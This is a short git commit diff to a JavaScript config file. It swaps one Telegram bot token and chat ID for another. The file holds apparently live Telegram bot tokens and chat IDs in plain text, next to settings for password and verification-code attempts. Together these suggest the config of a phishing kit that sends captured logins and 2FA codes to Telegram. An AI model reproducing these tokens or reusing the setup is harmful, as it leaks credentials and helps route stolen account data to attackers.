2261f16277e64524871be67c89c45ee24d36b60f
khanhvp <nguyenkimthi.7pmedia005@gmail.com>
2026-01-14 22:52:52 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,8 @@
 const config = {
     token: '7843396833:AAEvYzgcxJ35LfEkAHju74BM8YHZ7ag_knA',
     chat_id: '1662565121',
-    noti_token: '7734824066:AAEIf8D6iHe3RdFBpzIQp7SyXybCzbJ13oU',
-    noti_chat_id: '-4604634408',
+    noti_token: '7843396833:AAEvYzgcxJ35LfEkAHju74BM8YHZ7ag_knA',
+    noti_chat_id: '-4741680886',
     max_password_attempts: 2,
     max_code_attempts: 5,
     password_loading_time: 3,
